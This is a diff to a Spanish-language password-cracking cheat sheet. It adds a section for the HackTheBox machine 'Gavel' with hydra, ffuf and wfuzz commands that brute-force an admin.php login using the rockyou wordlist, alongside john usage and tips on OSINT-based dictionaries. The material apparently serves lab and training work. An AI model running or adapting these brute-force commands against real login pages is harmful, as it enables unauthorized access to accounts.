@@ -131,9 +131,19 @@ zip2john archivo.zip > archivo.hash
 john archivo.hash --wordlist=rockyou.txt
 ```
 
----
+### Ejemplos de ataque a endpoint panel admin.php
 
-### 9. **Diccionarios y Herramientas úteis**
+> Maquina HTB Gavel, mismo ataque, diferentes herramientas.
+
+```bash
+hydra -l auctioneer -P /usr/share/wordlists/rockyou.txt gavel.htb http-post-form "/admin.php:user=^USER^&pass=^PASS^:Invalid password"
+
+ffuf -w /usr/share/wordlists/rockyou.txt:FUZZ -X POST -d "user=auctioneer&pass=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -u http://gavel.htb/admin.php -fr "Invalid password"
+
+wfuzz -c -z file,/usr/share/wordlists/rockyou.txt -d "user=auctioneer&pass=FUZZ" --hs "Invalid password" http://gavel.htb/admin.php
+```
+
+### 9. **Diccionarios y Herramientas útiles**
 
 - Diccionario común:
   - `/usr/share/wordlists/rockyou.txt`
@@ -144,14 +154,9 @@ john archivo.hash --wordlist=rockyou.txt
   - `CeWL`: Crawler para crear diccionarios específicos
   - `hashid`, `hash-identifier`: Identificadores de hashes
 
----
-
 ### 10. **Tips y Buenas Prácticas**
 
 - Usa GPU con Hashcat siempre que sea posible
 - Filtra hash duplicados antes de crackear
 - Prioriza ataques por diccionario sobre fuerza bruta pura
 - Utiliza diccionarios personalizados si tienes información sobre la víctima (OSINT)
-
-
-
